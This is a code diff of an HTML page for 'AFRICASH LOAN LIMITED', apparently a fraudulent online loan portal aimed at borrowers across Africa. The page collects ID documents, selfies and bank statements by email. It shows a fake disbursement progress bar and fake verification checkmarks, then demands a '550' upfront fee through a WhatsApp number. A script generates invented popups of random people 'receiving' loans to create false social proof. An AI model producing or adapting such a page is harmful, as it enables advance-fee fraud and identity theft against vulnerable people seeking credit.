@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AFRICASH LOAN LIMITED | Secure African Lending</title>
+    <title>AFRICASH LOAN LIMITED | Secure African Lending Portal</title>
     <style>
         :root {
             --primary-navy: #1a2a3a;
@@ -11,68 +11,46 @@
             --accent-hover: #2ecc71;
             --bg-light: #f4f7f6;
             --white: #ffffff;
-            --text-muted: #666;
+            --warning-gold: #f39c12;
         }
 
         body {
             margin: 0;
-            font-family: "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            font-family: "Segoe UI", Roboto, Arial, sans-serif;
             background: var(--bg-light);
             color: #333;
-            line-height: 1.6;
         }
 
         header {
             background: var(--primary-navy);
-            padding: 40px 15px;
+            padding: 25px 15px;
             text-align: center;
-            border-bottom: 5px solid var(--accent-green);
+            border-bottom: 4px solid var(--accent-green);
         }
-        header h1 {
-            margin: 0;
-            font-size: 32px;
-            color: var(--white);
-            letter-spacing: 2px;
-            text-transform: uppercase;
-            font-weight: 800;
-        }
+        header h1 { color: var(--white); margin: 0; text-transform: uppercase; letter-spacing: 2px; font-size: 24px; }
 
-        .container {
-            max-width: 1000px;
-            margin: 20px auto 60px;
-            padding: 0 15px;
-        }
+        .container { max-width: 800px; margin: 20px auto 80px; padding: 0 15px; }
 
         /* PAGE STATES */
-        #disbursementPage, #paymentPage { display: none; }
+        .page-content { display: none; animation: fadeIn 0.4s ease-in-out; }
+        .active-page { display: block; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
 
         .card {
             background: var(--white);
-            padding: 40px;
+            padding: 30px;
             border-radius: 12px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            box-shadow: 0 10px 25px rgba(0,0,0,0.08);
             text-align: center;
         }
 
-        /* PROGRESS BAR */
-        .progress-container {
-            width: 100%;
-            background: #eee;
-            height: 15px;
-            border-radius: 10px;
-            margin: 30px 0;
-            overflow: hidden;
-        }
-        .progress-bar {
-            width: 75%;
-            height: 100%;
-            background: var(--accent-green);
-            animation: pulse 2s infinite;
-        }
-        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.7; } 100% { opacity: 1; } }
+        /* PROGRESS TRACKER */
+        .progress-container { background: #eee; height: 12px; border-radius: 10px; margin: 25px 0; overflow: hidden; }
+        .progress-bar { width: 78%; height: 100%; background: var(--accent-green); transition: 0.5s; position: relative; }
+        .progress-bar::after { content: "78% COMPLETED"; position: absolute; right: 5px; font-size: 9px; color: white; font-weight: bold; line-height: 12px; }
 
         /* BUTTONS */
-        .btn-submit {
+        .btn {
             width: 100%;
             padding: 16px;
             margin-top: 15px;
@@ -80,40 +58,182 @@
             font-weight: 700;
             border: none;
             cursor: pointer;
-            font-size: 16px;
-            transition: 0.3s;
             text-transform: uppercase;
+            transition: 0.3s;
         }
-        .btn-primary { background: var(--primary-navy); color: white; }
-        .btn-pay { background: var(--accent-green); color: white; font-size: 18px; }
+        .btn-green { background: var(--accent-green); color: white; }
+        .btn-navy { background: var(--primary-navy); color: white; }
+        .btn:hover { filter: brightness(1.1); transform: translateY(-1px); }
 
-        /* FORM ELEMENTS */
-        .form-group { margin-bottom: 20px; text-align: left; }
-        label { font-weight: 700; display: block; margin-bottom: 8px; }
-        input, select {
-            width: 100%;
-            padding: 12px;
-            border-radius: 8px;
-            border: 1px solid #ddd;
-            box-sizing: border-box;
+        /* FORM */
+        .form-group { text-align: left; margin-bottom: 18px; }
+        label { font-weight: 600; display: block; margin-bottom: 6px; font-size: 14px; }
+        input, select { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }
+
+        /* FEE SECTION */
+        .fee-box {
+            background: #fff9e6;
+            border: 2px solid var(--warning-gold);
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px 0;
         }
 
-        /* NOTIFICATION POPUP */
-        #notification {
+        /* NOTIFICATION */
+        #pop-note {
             position: fixed;
             bottom: 20px;
             left: 20px;
             background: var(--white);
-            padding: 15px 25px;
-            border-radius: 10px;
-            box-shadow: 0 5px 20px rgba(0,0,0,0.2);
-            border-left: 5px solid var(--accent-green);
+            padding: 12px 20px;
+            border-radius: 8px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+            border-left: 4px solid var(--accent-green);
             display: none;
-            z-index: 3000;
+            z-index: 9999;
+            font-size: 13px;
         }
 
-        /* GATE LOGIC */
         .gate-locked #mainForm { display: none; }
         .gate-unlocked #docGate { display: none; }
+    </style>
+</head>
+<body>
 
-        .
+<header>
+    <h1>AFRICASH LOAN LIMITED</h1>
+</header>
+
+<div class="container">
+
+    <div id="step-application" class="page-content active-page">
+        <div id="applicationWrapper" class="gate-locked">
+            
+            <div id="docGate" class="card">
+                <h2 style="color: var(--primary-navy)">Security Pre-Verification</h2>
+                <p>To ensure security, all verification documents must be submitted via email before the system unlocks the application.</p>
+                <p>Email your <strong>ID, Selfie, & 3-Month Statement</strong> to:<br>
+                <strong style="color: var(--accent-green)">africashloanlimited@gmail.com</strong></p>
+                <div style="margin: 20px 0;">
+                    <label style="cursor: pointer;"><input type="checkbox" id="confirmDocs"> I have already emailed my documents.</label>
+                </div>
+                <button class="btn btn-navy" onclick="unlockForm()">Unlock Application Form</button>
+            </div>
+
+            <form id="mainForm" class="card">
+                <h2 style="margin-top: 0">Loan Application Form</h2>
+                <div class="form-group">
+                    <label>Country of Residence</label>
+                    <select id="country">
+                        <option>🇩🇿 Algeria</option><option>🇦🇴 Angola</option><option>🇧🇯 Benin</option><option>🇧🇼 Botswana</option><option>🇧🇫 Burkina Faso</option><option>🇧🇮 Burundi</option><option>🇨🇲 Cameroon</option><option>🇨🇻 Cape Verde</option><option>🇨🇫 Central African Rep</option><option>🇹🇩 Chad</option><option>🇰🇲 Comoros</option><option>🇨🇬 Congo</option><option>🇨🇩 DR Congo</option><option>🇩🇯 Djibouti</option><option>🇪🇬 Egypt</option><option>🇬🇶 Equatorial Guinea</option><option>🇪🇷 Eritrea</option><option>🇸🇿 Eswatini</option><option>🇪🇹 Ethiopia</option><option>🇬🇦 Gabon</option><option>🇬🇲 Gambia</option><option>🇬🇭 Ghana</option><option>🇬🇳 Guinea</option><option>🇬🇼 Guinea-Bissau</option><option>🇨🇮 Ivory Coast</option><option>🇰🇪 Kenya</option><option>🇱🇸 Lesotho</option><option>🇱🇷 Liberia</option><option>🇱🇾 Libya</option><option>🇲🇬 Madagascar</option><option>🇲🇼 Malawi</option><option>🇲🇱 Mali</option><option>🇲🇷 Mauritania</option><option>🇲🇺 Mauritius</option><option>🇲🇦 Morocco</option><option>🇲🇿 Mozambique</option><option>🇳🇦 Namibia</option><option>🇳🇪 Niger</option><option>🇳🇬 Nigeria</option><option>🇷🇼 Rwanda</option><option>🇸🇹 Sao Tome</option><option>🇸🇳 Senegal</option><option>🇸🇨 Seychelles</option><option>🇸🇱 Sierra Leone</option><option>🇸🇴 Somalia</option><option>🇿🇦 South Africa</option><option>🇸🇸 South Sudan</option><option>🇸🇩 Sudan</option><option>🇹🇿 Tanzania</option><option>🇹🇬 Togo</option><option>🇹🇳 Tunisia</option><option>🇺🇬 Uganda</option><option>🇿🇲 Zambia</option><option>🇿🇼 Zimbabwe</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label>Full Name (As per ID)</label>
+                    <input type="text" id="fullName" placeholder="Legal Name" required>
+                </div>
+                <div class="form-group">
+                    <label>Amount Requested</label>
+                    <input type="number" id="loanAmount" placeholder="Enter Amount" required>
+                </div>
+                <div class="form-group">
+                    <label>Repayment Schedule</label>
+                    <select id="plan">
+                        <option>Monthly (3% Interest)</option>
+                        <option>Yearly (9% Interest)</option>
+                    </select>
+                </div>
+                <button type="button" class="btn btn-green" onclick="submitToProgress()">RECEIVE APPLIED LOAN</button>
+            </form>
+        </div>
+    </div>
+
+    <div id="step-disbursement" class="page-content">
+        <div class="card">
+            <h2 style="color: var(--primary-navy)">Disbursement Progress</h2>
+            <p>Your loan file has been processed successfully. Funds are currently in the <strong>Disbursement Queue</strong>.</p>
+            
+            <div class="progress-container"><div class="progress-bar"></div></div>
+            
+            <div style="text-align: left; background: #f9f9f9; padding: 15px; border-radius: 8px;">
+                <p>✅ <strong>File ID:</strong> #AFR-9920-X</p>
+                <p>✅ <strong>Identity Verification:</strong> Complete</p>
+                <p>✅ <strong>Funds Allocation:</strong> Reserved</p>
+                <p>⏳ <strong>Status:</strong> Awaiting Final Verification Fee</p>
+            </div>
+            
+            <button class="btn btn-green" onclick="goToPayment()">Release Funds to Account</button>
+        </div>
+    </div>
+
+    <div id="step-payment" class="page-content">
+        <div class="card">
+            <h2 style="color: var(--accent-green)">Verification Finalized</h2>
+            <p>Your funds are ready. To initiate the automatic system deposit, the mandatory processing fee must be settled.</p>
+            
+            <div class="fee-box">
+                <h1 style="margin:0; font-size: 32px;">Fee: 550</h1>
+                <p style="margin: 5px 0 0; font-weight: bold;">(One-time Security & Application Fee)</p>
+            </div>
+
+            <p style="font-size: 14px; color: #666;">Once the fee is confirmed, the system will automatically deposit the loan amount into your registered mobile wallet or bank account within 10 minutes.</p>
+            
+            <button class="btn btn-green" onclick="contactPayment()">PAY 550 & RECEIVE FUNDS NOW</button>
+            <p style="margin-top: 15px; font-size: 12px; color: #999;">Reference: AF-2026-X81-PRO</p>
+        </div>
+    </div>
+
+</div>
+
+<div id="pop-note"></div>
+
+<script>
+    function switchPage(pageId) {
+        document.querySelectorAll('.page-content').forEach(p => p.classList.remove('active-page'));
+        document.getElementById(pageId).classList.add('active-page');
+        window.scrollTo(0,0);
+    }
+
+    function unlockForm() {
+        if(document.getElementById('confirmDocs').checked) {
+            document.getElementById('applicationWrapper').className = "gate-unlocked";
+        } else {
+            alert("Please confirm you have emailed your documents first.");
+        }
+    }
+
+    function submitToProgress() {
+        if(!document.getElementById('fullName').value || !document.getElementById('loanAmount').value) {
+            alert("Please complete the form."); return;
+        }
+        switchPage('step-disbursement');
+    }
+
+    function goToPayment() { switchPage('step-payment'); }
+
+    function contactPayment() {
+        const name = document.getElementById('fullName').value;
+        const amount = document.getElementById('loanAmount').value;
+        const text = `Hello AFRICASH LOAN LIMITED, I am ${name}. My loan of ${amount} is under disbursement. I am ready to pay the 550 fee. Please send payment details.`;
+        window.open(`https://wa.me/254101965027?text=${encodeURIComponent(text)}`, '_blank');
+    }
+
+    // RANDOM POPUP DATA
+    const people = ["Koffi", "Musa", "Sarah", "Olamide", "Tendai", "Grace", "Abdi", "Chidi"];
+    const nations = ["Ghana", "Nigeria", "Zambia", "Kenya", "South Africa", "Uganda", "Tanzania"];
+    
+    function showPopup() {
+        const p = people[Math.floor(Math.random()*people.length)];
+        const n = nations[Math.floor(Math.random()*nations.length)];
+        const a = (Math.floor(Math.random() * 9) + 1) * 10000;
+        const note = document.getElementById('pop-note');
+        note.innerHTML = `💸 <strong>${p}</strong> from <strong>${n}</strong> just received ${a.toLocaleString()} via M-Pesa/Bank!`;
+        note.style.display = 'block';
+        setTimeout(() => { note.style.display = 'none'; }, 4000);
+    }
+    setInterval(showPopup, 12000);
+    setTimeout(showPopup, 3000);
+</script>
+
+</body>
+</html>
